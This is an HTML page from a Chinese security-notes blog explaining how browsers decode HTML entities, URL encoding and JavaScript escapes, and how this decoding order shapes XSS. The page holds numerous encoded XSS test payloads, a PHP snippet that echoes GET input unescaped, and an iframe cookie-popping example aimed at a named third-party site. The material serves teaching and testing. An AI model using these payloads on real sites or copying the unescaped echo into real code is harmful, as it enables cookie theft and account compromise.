@@ -1,0 +1,300 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  <title>一、html, js 的自解码机制｜Web 安全 / XSS与客户端｜BEN.OPS</title>
+  <meta name="description" content="一、html, js 的自解码机制。本文属于Web 安全 / XSS与客户端，html 的解析顺序：html parser --&gt; css parser --&gt;javascript parser &#x27;)&quot; /&gt; 我们可以看到这个button添加了click事件，那么当点击按钮的时候会向网页的文档流中插入html代码…">
+  <meta name="keywords" content="Web 安全，XSS与客户端，PHP，Java，XSS，漏洞，知识笔记，Web 安全 / XSS与客户端，一、html, js 的自解码机制">
+  <meta name="author" content="BEN">
+  <meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+  <meta name="googlebot" content="index,follow,max-snippet:-1,max-image-preview:large">
+  <meta name="baiduspider" content="index,follow">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <link rel="canonical" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b5649559bd4c.html">
+  <link rel="alternate" hreflang="zh-CN" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b5649559bd4c.html">
+  <link rel="alternate" type="text/markdown" href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141600-Web%20%E5%AE%89%E5%85%A8%2BXSS%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%2BPHP%2BJava-%E4%B8%80%E3%80%81html%2C%20js%20%E7%9A%84%E8%87%AA%E8%A7%A3%E7%A0%81%E6%9C%BA%E5%88%B6.md">
+  <link rel="alternate" type="application/rss+xml" title="BEN.OPS RSS" href="https://ben2023niao.github.io/ben-ops-notes/assets/rss.xml">
+  <link rel="alternate" type="application/xml" title="BEN.OPS Sitemap" href="https://ben2023niao.github.io/ben-ops-notes/assets/sitemap.xml">
+  <link rel="author" href="https://t.me/Ben_Bird">
+  <meta property="og:type" content="article">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:site_name" content="BEN.OPS 工程笔记">
+  <meta property="og:title" content="一、html, js 的自解码机制">
+  <meta property="og:description" content="一、html, js 的自解码机制。本文属于Web 安全 / XSS与客户端，html 的解析顺序：html parser --&gt; css parser --&gt;javascript parser &#x27;)&quot; /&gt; 我们可以看到这个button添加了click事件，那么当点击按钮的时候会向网页的文档流中插入html代码…">
+  <meta property="og:url" content="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b5649559bd4c.html">
+  <meta property="article:published_time" content="2023-04-14T16:00:00">
+  <meta property="article:modified_time" content="2023-04-14 16:00">
+  <meta property="article:section" content="Web 安全 / XSS与客户端">
+  <meta property="article:author" content="https://t.me/Ben_Bird">
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="一、html, js 的自解码机制">
+  <meta name="twitter:description" content="一、html, js 的自解码机制。本文属于Web 安全 / XSS与客户端，html 的解析顺序：html parser --&gt; css parser --&gt;javascript parser &#x27;)&quot; /&gt; 我们可以看到这个button添加了click事件，那么当点击按钮的时候会向网页的文档流中插入html代码…">
+  
+  <style>:root{color-scheme:light dark;--bg:#f4f0e8;--panel:#fffdf8;--bg2:#e8e1d6;--fg:#202621;--muted:#66736b;
+--line:#d4cbbd;--accent:#176b55;--accent2:#0b6094;--code:#17211d;--codefg:#d8f0e4;--warn:#9b5c12;
+--max:1120px}@media(prefers-color-scheme:dark){:root{--bg:#111713;--panel:#18201b;--bg2:#202b24;
+--fg:#dce9df;--muted:#9aad9f;--line:#314238;--accent:#67d4ad;--accent2:#76b9df;--code:#0a100d;
+--codefg:#cceadd;--warn:#f0b35c}}*{box-sizing:border-box}html{scroll-behavior:smooth;background:var(--bg)}
+body{margin:0;background:radial-gradient(circle at 15% 0,color-mix(in srgb,var(--accent) 8%,transparent),transparent 32rem),var(--bg);
+color:var(--fg);font:16px/1.82 ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif}
+a{color:var(--accent);text-underline-offset:.22em}a:hover{color:var(--accent2)}.shell{width:min(var(--max),calc(100% - 32px));margin:auto}
+.topbar{position:sticky;top:0;z-index:5;border-bottom:1px solid var(--line);background:color-mix(in srgb,var(--bg) 88%,transparent);
+backdrop-filter:blur(14px)}.topbar .shell{min-height:62px;display:flex;align-items:center;gap:18px}.brand{font:700 1rem/1 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--fg);text-decoration:none;letter-spacing:.04em}.brand b{color:var(--accent)}.topbar nav{margin-left:auto;display:flex;gap:16px;flex-wrap:wrap;font-size:.9rem}
+main{padding:34px 0 64px}.crumbs{font-size:.84rem;color:var(--muted);margin-bottom:18px}.hero{border:1px solid var(--line);background:var(--panel);
+border-radius:16px;padding:clamp(20px,4vw,42px);box-shadow:0 16px 50px #0000000a}.eyebrow{font:700 .74rem/1.2 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--accent);letter-spacing:.12em;text-transform:uppercase}.hero h1{font-size:clamp(1.8rem,4.4vw,3.2rem);line-height:1.2;margin:.55rem 0 1rem;
+letter-spacing:-.025em;overflow-wrap:anywhere}.lede{font-size:1.04rem;color:var(--muted);max-width:75ch;margin:0 0 18px}.meta{display:flex;flex-wrap:wrap;gap:8px}
+.badge{display:inline-flex;align-items:center;border:1px solid var(--line);border-radius:999px;padding:.22rem .68rem;background:var(--bg2);
+font-size:.78rem;color:var(--fg);text-decoration:none}.layout{margin-top:24px;display:grid;grid-template-columns:minmax(0,1fr) 260px;gap:24px;align-items:start}
+.article,.aside-box,.seo-summary{border:1px solid var(--line);background:var(--panel);border-radius:14px}.article{padding:clamp(20px,4vw,48px);min-width:0}
+.article h1,.article h2,.article h3,.article h4{line-height:1.35;letter-spacing:-.012em;scroll-margin-top:80px}.article h2{margin-top:2.2em;padding-top:.6em;
+border-top:1px solid var(--line)}.article h1{display:none}.article img{display:block;max-width:100%;height:auto;margin:1.4rem auto;border-radius:8px}
+.article pre{overflow:auto;background:var(--code);color:var(--codefg);padding:16px;border-radius:9px;line-height:1.6}
+.article code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.9em}.article :not(pre)>code{background:var(--bg2);padding:.12em .34em;border-radius:4px}
+.article table{display:block;max-width:100%;overflow:auto;border-collapse:collapse}.article th,.article td{border:1px solid var(--line);padding:.45rem .65rem}
+.article blockquote{margin:1.4rem 0;padding:.4rem 1rem;border-left:4px solid var(--accent);background:var(--bg2);color:var(--muted)}
+.article hr{border:0;border-top:1px solid var(--line);margin:2rem 0}.aside{position:sticky;top:82px;display:grid;gap:14px}
+.aside-box{padding:16px}.aside-box h2{font-size:.83rem;margin:0 0 12px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.aside-box ol,.aside-box ul{margin:0;padding-left:1.15rem}.aside-box li{margin:.5rem 0;font-size:.9rem}.aside-box a{text-decoration:none}
+.seo-summary{margin-top:24px;padding:20px 24px}.seo-summary h2{font-size:1rem;margin:0 0 .65rem}.seo-summary p{margin:0;color:var(--muted)}
+.pager{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}.pager a{border:1px solid var(--line);border-radius:12px;
+padding:14px 16px;background:var(--panel);text-decoration:none}.pager a:last-child{text-align:right}.pager small{display:block;color:var(--muted)}
+footer{padding:28px 0 48px;border-top:1px solid var(--line);color:var(--muted);font-size:.88rem}footer .shell{display:flex;gap:16px;flex-wrap:wrap}
+.index-hero h1{font-size:clamp(2.1rem,6vw,4.4rem)}.stat-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px;margin-top:20px}
+.stat{border:1px solid var(--line);background:var(--bg2);border-radius:10px;padding:12px}.stat strong{display:block;font:700 1.35rem/1.2 ui-monospace,monospace}
+.stat span{font-size:.78rem;color:var(--muted)}.year{margin-top:34px}.year>h2{position:sticky;top:62px;z-index:2;margin:0;padding:12px 0;
+background:color-mix(in srgb,var(--bg) 92%,transparent);backdrop-filter:blur(8px);font:700 1.25rem/1.2 ui-monospace,monospace}
+.cards{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}.card{border:1px solid var(--line);background:var(--panel);border-radius:12px;padding:18px}
+.card h3{font-size:1.02rem;line-height:1.45;margin:.35rem 0 .55rem}.card h3 a{text-decoration:none}.card p{margin:.45rem 0;color:var(--muted);font-size:.87rem}
+.card .date{font:600 .77rem/1 ui-monospace,monospace;color:var(--accent)}.tags{display:flex;flex-wrap:wrap;gap:5px}.tag{font-size:.72rem;color:var(--muted);border:1px solid var(--line);
+border-radius:99px;padding:.12rem .48rem}@media(max-width:860px){.layout{grid-template-columns:1fr}.aside{position:static;grid-row:1}.cards{grid-template-columns:1fr}}
+@media(max-width:620px){body{font-size:15px}.shell{width:min(100% - 22px,var(--max))}.topbar nav{gap:10px;font-size:.8rem}.hero,.article{padding:18px}
+.meta{gap:6px}.stat-grid{grid-template-columns:repeat(2,1fr)}.pager{grid-template-columns:1fr}.pager a:last-child{text-align:left}}
+@media print{.topbar,.aside,.pager,footer{display:none}.shell{width:100%}.article,.hero{border:0;box-shadow:none;padding:0}}</style>
+  <script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","@id":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b5649559bd4c.html#article","headline":"一、html, js 的自解码机制","description":"一、html, js 的自解码机制。本文属于Web 安全 / XSS与客户端，html 的解析顺序：html parser --> css parser -->javascript parser ')\" /> 我们可以看到这个button添加了click事件，那么当点击按钮的时候会向网页的文档流中插入html代码…","datePublished":"2023-04-14T16:00:00","dateModified":"2023-04-14 16:00","inLanguage":"zh-CN","articleSection":["Web 安全","XSS与客户端"],"keywords":["Web 安全","XSS与客户端","PHP","Java","XSS","漏洞","知识笔记","Web 安全 / XSS与客户端","一、html, js 的自解码机制"],"wordCount":2600,"mainEntityOfPage":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b5649559bd4c.html","url":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b5649559bd4c.html","author":{"@type":"Person","name":"BEN","url":"https://t.me/Ben_Bird"},"publisher":{"@type":"Organization","name":"BEN.OPS 工程笔记","url":"https://ben2023niao.github.io/ben-ops-notes/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"BEN.OPS 工程笔记","item":"https://ben2023niao.github.io/ben-ops-notes/"},{"@type":"ListItem","position":2,"name":"Web 安全 / XSS与客户端","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html"},{"@type":"ListItem","position":3,"name":"一、html, js 的自解码机制","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b5649559bd4c.html"}]}]}</script>
+</head>
+<body>
+  <header class="topbar"><div class="shell">
+    <a class="brand" href="https://ben2023niao.github.io/ben-ops-notes/"><b>$_</b> BEN.OPS</a>
+    <nav aria-label="站点导航">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">交互知识库</a>
+      <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">静态文章索引</a>
+      <a href="https://t.me/Ben_Bird">@Ben_Bird</a>
+    </nav>
+  </div></header>
+  <main class="shell">
+    <nav class="crumbs" aria-label="面包屑">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">首页</a> › <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">工程笔记</a>
+      › <span>Web 安全 / XSS与客户端</span> › <span>一、html, js 的自解码机制</span>
+    </nav>
+    <header class="hero">
+      <div class="eyebrow">Web 安全 / XSS与客户端</div>
+      <h1>一、html, js 的自解码机制</h1>
+      <p class="lede">一、html, js 的自解码机制。本文属于Web 安全 / XSS与客户端，html 的解析顺序：html parser --&gt; css parser --&gt;javascript parser &#x27;)&quot; /&gt; 我们可以看到这个button添加了click事件，那么当点击按钮的时候会向网页的文档流中插入html代码…</p>
+      <div class="meta">
+        <time class="badge" datetime="2023-04-14T16:00:00">发布于 2023-04-14</time>
+        <span class="badge">作者 BEN</span>
+        <span class="badge">2,600 字</span>
+        <span class="badge">8 分钟阅读</span>
+      </div>
+    </header>
+    <div class="layout">
+      <article class="article" itemscope itemtype="https://schema.org/TechArticle">
+        
+<h2 id="一-html-js-的自解码机制">一、html, js 的自解码机制</h2>
+<p>html 的解析顺序：html parser --&gt; css parser --&gt;javascript parser</p>
+<p><code>&lt;input type="button" id="exec_btn"  value="exec" onclick="document.write('&lt;img src=@ onerror=alert(123)&gt;')" /&gt;</code>
+我们可以看到这个button添加了click事件，那么当点击按钮的时候会向网页的文档流中插入html代码，弹出对话框。</p>
+<pre><code class="language-javascript">&lt;script&gt;
+function HtmlEncode(str) {
+    var s = "";
+    if (str.length == 0) return "";
+    s = str.replace(/&amp;/g, "&amp;amp;");
+    s = s.replace(/&lt;/g, "&amp;lt;");
+    s = s.replace(/&gt;/g, "&amp;gt;");
+    s = s.replace(/\"/g, "&amp;quot;");
+    return s;
+}
+&lt;/script&gt;
+</code></pre>
+<p>A: <code>&lt;input type="button"  id="exec_btn" value="exec" onclick="document.write (HtmlEncode('&amp;lt;img src=@ onerror=alert(123) /&amp;gt;'))"  /&gt;</code>
+B: <code>&lt;input type="button"  id="exec_btn" value="exec" onclick="document.write (HtmlEncode('&lt;img src=@ onerror=alert(123) /&gt;'))"  /&gt;</code></p>
+<p>上面两条的执行结果是一样的，都只是在网页中输出了<code>&lt;img src=@ onerror=alert(123) /&gt;</code> 而没有弹框， 只不过A中的js代码在执行前已经先按照html的形式解码了，浏览器已经先将 <code>&amp;lt;img src=@ onerror=alert(123) /&amp;gt;</code> 解码成 <code>&lt;img src=@ onerror=alert(123) /&gt;</code>，所以他们的执行效果是一样的。</p>
+<p>关键的问题是这里的js代码是出现在html标签之间的，因为嵌入到html标签中的js 代码在解析之前会先按照html规则进行自动解码，包括：
+进制编码：&amp;#xH（十六进制格式）、&amp;#D（十进制格式）。
+HTML 实体编码，下面是 html5 新增的实体编码：
+&amp;colon; =&gt; [冒号]
+&amp;NewLine; =&gt; [换行]
+case: <code>&lt;a href="javasc&amp;NewLine;ript&amp;colon;alert(1)"&gt;click&lt;/a&gt;</code></p>
+<p>以上是关于js在html内的解码，那么假如用户的输入后所传递的值并不是出现在html标签之内，而是出现在js中呢？ 浏览器也有js的解析规则，还是举例子来说明</p>
+<pre><code class="language-javascript">&lt;script&gt;
+ document.write('&amp;lt;img src=@ onerror=alert(123) /&amp;gt;');
+&lt;/script&gt;
+</code></pre>
+<p>上边的例子会弹出对话框吗?是不会的，因为它出现在js代码之中，上下文环境为JavaScript，浏览器解析前会将出现在js代码中的以下内容编码进行解码</p>
+<p>1):UniCode形式(\uH)</p>
+<pre><code class="language-javascript">&lt;script&gt;
+ document.write('\u003Cimg src=@ onerror=alert(123) /\u003E');
+&lt;/script&gt;
+</code></pre>
+<p>我们发现这个例子弹出对话框了，道理是一样的，js在执行前已经将特殊字符解码了。</p>
+<p>2):普通16进制(\xHH) 或者 8进制([0-7]{1,3})</p>
+<pre><code class="language-javascript">&lt;script&gt;
+ document.write('\x3Cimg src=@ onerror=alert(123) /\x3E');
+&lt;/script&gt;
+</code></pre>
+<p>3):纯转义，如果用户带入js代码的内容中含有 '、"、&lt; 、&gt; 这些字符将他们进行转义是没有意义的，还是会原样的输出
+看下边的示例:</p>
+<pre><code class="language-javascript">&lt;script&gt;
+ //document.write('\&lt;img src=@ onerror=alert(123) /\&gt;'); //弹框
+ //document.write('te\'st'); //te'st
+ //document.write('te\"st'); //te"st
+&lt;/script&gt;
+</code></pre>
+<p>由此可知 在js代码中对这些字符转义是没意义的。</p>
+<p>具有 HtmlEncode 功能的标签
+如 &lt;textarea&gt;、&lt;title&gt;、&lt;iframe&gt;、&lt;noscript&gt;、&lt;noframes&gt;、&lt;xmp&gt;、&lt;plaintext&gt;， html 在这些标签里面是不解析的，比如 <code>$('tt').innerHTML='&lt;img src=@ onerror=alert(123) /&gt;'</code>，不会造成弹框。&lt;xmp&gt; 没有HtmlEncode 功能，&lt;plaintext&gt; 在 Firefox 下不会进行 HtmlEncode 编码，而在 Chrome 下面会。</p>
+<h2 id="二-解码顺序">二、解码顺序</h2>
+<p>1.第一个例子，现在考虑这三种编码同时存在的情况
+<code>&lt;a href="javascript&amp;#58;&amp;#32;alert('\&lt;http&amp;#58;&amp;#47;&amp;#47;simba.cc/find?q=%E4%BD%A0%E5%A5%BD\&gt;');"&gt;click&lt;/a&gt;</code>
+首先是 HTML 解码，结果为
+<code>&lt;a href="javascript: alert('\&lt;http://simba.cc/find?q=%E4%BD%A0%E5%A5%BD\&gt;');"&gt;click&lt;/a&gt;</code> （上一行代码浏览器解析完查看dom树审查元素）
+点击链接后，先是 URL 解码，结果为（假设是 style 属性，则会执行 css 解码）
+<code>&lt;a href="javascript: alert('\&lt;http://simba.cc/find?q=你好\&gt;');"&gt;click&lt;/a&gt;</code>
+最后是 JS 解码，结果为
+<code>&lt;a href="javascript: alert('&lt;http://simba.cc/find?q=你好&gt;');"&gt;click&lt;/a&gt;</code>
+应该会出现一个弹窗，内容是 <code>&lt;http://simba.cc/find?q=你好&gt;</code> 。</p>
+<p>2.第二个例子，一段 php 代码</p>
+<pre><code class="language-php">&lt;html&gt;
+     &lt;head&gt;
+          &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
+     &lt;/head&gt;
+     &lt;body&gt;
+          &lt;a href="javascript:alert('&lt;?php echo $_GET['input'];?&gt;');"&gt;test&lt;/a&gt;
+     &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>当参数input的值为: <code>%26lt%5cu4e00%26gt</code> 的时候，因为 php 使用 $_GET 获取参数值（urldecode），故返回的 html 源码是  <code>&lt;a href="javascript:alert('&amp;lt\u4e00&amp;gt');"&gt;test&lt;/a&gt;</code>，浏览器解析时 html 解码 为 <code>&lt;a href="javascript:alert('&lt;\u4e00&gt;');"&gt;test&lt;/a&gt;</code> （查看dom 树审查元素），点击时进行 js 解码，故弹框为  <code>&lt;一&gt;</code></p>
+<h2 id="三-浏览器urlencode-的影响">三、浏览器urlencode 的影响</h2>
+<p>从浏览器 url 发出的请求，如果进行了 urlencode（比如chrome一般会编码 "&lt;&gt;，firefox 一般会编码 ' " ` &lt;&gt;， 而ie 分具体情况，如 /path/payload 会编码，而 /path/aa?bb=paylod 不会编码），比如将 <code>"</code> 转成<code>%22</code> 发出去，在服务器端的php 接收到的是原始的<code>"</code> 还是编码后的<code>%22</code> 得看用<code>$_GET["key"]</code> 还是<code>$_SERVER['QUERY_STRING']</code>，还要看在php 脚本内有没有做 <code>addslashes</code> 或者 <code>htmlspecialchars</code> 等函数调用，这样就能判断解析脚本 echo/print 出来的html 是怎样的组织形式，当然客户端请求得到的html 也就是这样的形式了。那为什么在chrome中对于&lt; 等没有alert 弹窗呢，只是因为某些浏览器有anti_xss 模块或者filter，在浏览器解析 html 的时候 过滤掉这些危险的script 而没有执行，比如 ie 可以关闭掉 xss 筛选器让其弹框，而chrome 对于直接从参数中引入到页面的标签会限制其执行。对于ie 而言，如果页面 js 取location.href or #锚参数 or  get参数 的值，则保持 地址栏原有模样（可能编码或者没编码）。其他浏览器 取到的都是编码后的样子（取决于浏览器本身会编码哪些字符发起请求，当然本身如二次url 编码后则取到的就是二次编码后的字符串）。这对于domxss 来说是一个比较重要的区分点，关注是否使用了 js 函数 decodeURIComponent()，也是是否会造成 domxss 漏洞的一个区分点。</p>
+<p>为了看参数是否Urlencode对返回结果是否有影响，可以用一些工具比如 fiddle 发出编码和不编码时的请求，对比观察。这种不编码访问才能触发的xss 漏洞，最简单的利用方式是写一个html，里面用 iframe src 引入完整不编码 payload 链接，用 ie 访问此 html。注意如果此时弹 cookie 的话弹出的是 iframe 内 domain 域的 cookie，因为浏览器在请求第三方站点时也会把相关cookie发送出去（没有P3P 属性的 persistent cookie 有例外），如下：
+<code>&lt;html lang="zh-cn"&gt;&lt;body&gt;&lt;iframe src="http://subao.dayuw.cn/web/index.php?c=user&amp;a='};alert(document.cookie);aa={//"&gt;&lt;/body&gt;&lt;/html&gt;</code></p>
+<p>注意：由于同源策略的存在，本地html 是读取不到第三方站点 cookie的，但这里演示的是第三方站点自己存在漏洞，自己执行 js 弹cookie。</p>
+<h2 id="四-测试样例">四、测试样例</h2>
+<p>下面的测试用例涉及到的底层知识比较多，详情可以查阅Reference的第二篇文章，在这里只做简单介绍。</p>
+<p>Basics
+1. <code>&lt;a href="%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"&gt;&lt;/a&gt;</code>
+URL encoded "javascript:alert(1)"
+不会触发。javascript: 是 scheme，不能进行urlencode，否则 urldecode 时出现 "no scheme" 状态。
+2. <code>&lt;a href="&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29"&gt;</code>
+Character entity encoded "javascript" and URL encoded "alert(2)"
+触发。先进行 htmldecode，点击执行urldecode，最后执行 js。
+3. <code>&lt;a href="javascript%3aalert(3)"&gt;&lt;/a&gt;</code>
+URL encoded ":"
+不会触发。冒号是 scheme 的一部分。
+4. <code>&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</code>
+Character entity encoded &lt; and &gt;
+不会触发。&lt; &gt; 是识别 tag 的开始结束符，不能进行编码。
+5. <code>&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</code>
+Character entity encoded &lt; and &gt;
+如前所述，textarea 等标签内不会进行 htmldecode。
+6. <code>&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;</code>
+不会触发。textarea 标签内不会执行 js，除非我们先把它闭合了。</p>
+<p>Advanced
+7. <code>&lt;button onclick="confirm('7&amp;#39;);"&gt;Button&lt;/button&gt;</code>
+Character entity encoded '
+触发。先进行 htmldecode，点击触发 js 事件
+8. <code>&lt;button onclick="confirm('8\u0027);"&gt;Button&lt;/button&gt;</code>
+Unicode escape sequence encoded '
+不会触发。' " ( ) 的unicode 编码形式在这里只是字符串的文本含义，并不能表示真正的引号闭合。
+9. <code>&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</code>
+Character entity encoded alert(9);
+不会触发。script 域内不会进行 htmldecode
+(add: <code>&lt;script src="&amp;#x61h.js"&gt;&lt;/script&gt;</code> // ah.js --&gt; alert(document.domain);)
+10. <code>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt;</code>
+Unicode Escape sequence encoded alert
+触发。function name 是 identifier name，可以用unicode 方式编码。
+(add: at here only unicode can be used to encode function name, but not \xHH or \OOO,
+of course we can</p>
+<pre><code class="language-javascript">var a = "\74\151\155\147\40\163\162\143\75\43\40\157\156\145\162\162\157\162\75\141\154\145\162\164\50\61\51\76";
+document.body.innerHTML = a;   // &lt;img src=# onerror=alert(1)&gt;
+or
+&lt;div&gt;&lt;a href="javascript:\u0061lert('1\x62')"&gt;ga&lt;/a&gt;&lt;/div&gt;
+or
+&lt;img src="x" onerror="\u0061\u006c\u0065\u0072\u0074(1)"&gt;
+</code></pre>
+<p>)
+11. <code>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;/script&gt;</code>
+Unicode Escape sequence encoded alert(11)
+不会触发。同问题2。
+12. <code>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;/script&gt;</code>
+Unicode Escape sequence encoded alert and 12
+不会触发。unicode 编码的 1, 2 在这里不能表示成字符串，因为它们不是被包裹在 ' " 中。
+(add: the examples below works fine.</p>
+<pre><code class="language-javascript">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074('\u0031\u0032')&lt;/script&gt;
+&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(/\u0031\u0032/)&lt;/script&gt;
+&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(12)&lt;/script&gt;
+</code></pre>
+<p>)
+13. <code>&lt;script&gt;alert('13\u0027)&lt;/script&gt;</code>
+Unicode escape sequence encoded '
+不会触发。同问题2。
+14. <code>&lt;script&gt;alert('14\u000a')&lt;/script&gt;</code>
+Unicode escape sequence encoded line feed.
+触发。unicode 编码的换行符在这里并不会真正地换行而导致js 语法错误，而是普通的文本含义。
+15. <code>&lt;a href='javascript:focusUser("616d75576d3242746c5a7076%22-alert(777)-%22",1,"focusId");'&gt;</code>
+点击会触发。先进行urldecode，这样 js 函数内的双引号就可以闭合。
+<code>&lt;a href='javascript:focusUser("616d75576d3242746c5a7076%22-document.write(%27%3Ciframe/onload=alert(11)%3E%27)-%22",1,"focusId");'</code>
+在 ie 点击时会触发，可以将 <code>"-document.write('&lt;iframe/onload=alert(11)&gt;')-"</code> 提取出来作为一条 domxss 的测试用例。</p>
+<p>Bonus</p>
+<pre><code class="language-html">&lt;a
+href="&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;
+&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;
+&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;
+&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;
+&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;
+&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;
+&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;
+&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;
+&amp;#x35;&amp;#x29;"&gt;&lt;/a&gt;
+</code></pre>
+<p>You figure out the encoding on this yourself!
+(add: html decode --&gt; url decode --&gt; js decode, then it works!
+if href's value contain &amp;#34;  if will turn into &amp;quot;  inorder not to close the pre double quote )</p>
+<h2 id="Reference">Reference</h2>
+<p>《Web 前端黑客技术揭秘》
+<a href="http://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html" rel="noopener noreferrer">Deep dive into browser parsing and XSS payload encoding</a></p>
+      </article>
+      <aside class="aside">
+        <aside class="aside-box"><h2>本页目录</h2><ol><li style="margin-left:0.0rem"><a href="#一-html-js-的自解码机制">一、html, js 的自解码机制</a></li><li style="margin-left:0.0rem"><a href="#二-解码顺序">二、解码顺序</a></li><li style="margin-left:0.0rem"><a href="#三-浏览器urlencode-的影响">三、浏览器urlencode 的影响</a></li><li style="margin-left:0.0rem"><a href="#四-测试样例">四、测试样例</a></li><li style="margin-left:0.0rem"><a href="#Reference">Reference</a></li></ol></aside>
+        <div class="aside-box"><h2>文章信息</h2><ul>
+          <li>分类：Web 安全 / XSS与客户端</li>
+          <li>日期：2023-04-14</li>
+          <li>标签：<span class="tag">Web 安全</span><span class="tag">XSS与客户端</span><span class="tag">PHP</span><span class="tag">Java</span><span class="tag">XSS</span><span class="tag">漏洞</span><span class="tag">知识笔记</span></li>
+          <li><span>来源：01-Web安全/03-XSS与客户端/XSS/解码顺序.md</span></li><li><a href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141600-Web%20%E5%AE%89%E5%85%A8%2BXSS%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%2BPHP%2BJava-%E4%B8%80%E3%80%81html%2C%20js%20%E7%9A%84%E8%87%AA%E8%A7%A3%E7%A0%81%E6%9C%BA%E5%88%B6.md" type="text/markdown">查看 Markdown 原文</a></li>
+        </ul></div>
+        <div class="aside-box"><h2>作者</h2>
+          <p><a href="https://t.me/Ben_Bird">@Ben_Bird</a></p>
+          <p>Linux / DevOps / SRE / 云平台 / 安全运维</p>
+        </div>
+      </aside>
+    </div>
+    <section class="seo-summary" aria-labelledby="seo-summary-title">
+      <h2 id="seo-summary-title">文章摘要</h2>
+      <p>一、html, js 的自解码机制。本文属于Web 安全 / XSS与客户端，html 的解析顺序：html parser --&gt; css parser --&gt;javascript parser &#x27;)&quot; /&gt; 我们可以看到这个button添加了click事件，那么当点击按钮的时候会向网页的文档流中插入html代码…</p>
+      <p>关键词：Web 安全、XSS与客户端、PHP、Java、XSS、漏洞、知识笔记、Web 安全 / XSS与客户端、一、html, js 的自解码机制</p>
+    </section>
